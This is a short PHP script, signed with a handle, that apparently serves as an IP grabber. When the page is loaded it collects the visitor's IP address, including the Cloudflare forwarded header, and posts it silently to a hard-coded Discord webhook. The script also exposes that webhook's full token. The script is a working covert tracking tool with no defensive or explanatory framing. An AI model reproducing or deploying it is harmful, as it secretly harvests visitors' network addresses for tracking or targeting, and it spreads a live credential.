<?php
/* Ragekill3377 */


$IP = $_SERVER["HTTP_CF_CONNECTING_IP"] ?? $_SERVER['REMOTE_ADDR'];
$WH = "https://discord.com/api/webhooks/1321051594963550218/jrCE9j6nRnDfddYhiOmA2D9JPIRi1l3Sxgn5sTt8OvgMXLfykYM1pw9vJWO0UQmHoqlf";

$Embed = json_encode([
    "username" => "$IP",
    "content" => "IP: $IP"
]);

$C = curl_init($WH);
curl_setopt($C, CURLOPT_HTTPHEADER, ['Content-type: application/json']);
curl_setopt($C, CURLOPT_POSTFIELDS, $Embed);
curl_setopt($C, CURLOPT_RETURNTRANSFER, true);
curl_exec($C);
?>
